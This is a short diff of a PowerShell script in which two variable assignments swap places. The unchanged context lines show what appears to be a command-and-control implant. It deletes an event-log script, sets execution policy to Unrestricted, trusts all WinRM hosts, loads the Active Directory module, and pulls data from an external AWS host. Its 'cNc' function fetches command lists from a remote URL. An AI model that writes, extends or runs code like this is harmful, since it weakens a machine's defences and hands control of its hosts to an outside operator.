@@ -8,8 +8,8 @@ remove-item c:\Windows\EventLog.ps1
 [net.servicepointmanager]::SecurityProtocol = [net.securityprotocoltype]::Tls12
 import-module activedirectory
 set-executionpolicy Unrestricted -force
-$read = @()
 
+$hostIP= Get-NetIPAddress | where {($_.IPAddress -like "10.*")}
 Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
 $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
 $toAppend=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt
@@ -180,7 +180,7 @@ start-job -ScriptBlock {
 
 function cNc{
     $httpCommand=invoke-restmethod $cNcURL
-    $hostIP= Get-NetIPAddress | where {($_.IPAddress -like "10.*")}
+    $read = @()
     
     foreach($line in Get-Content $httpCommand) {
         $read += $line
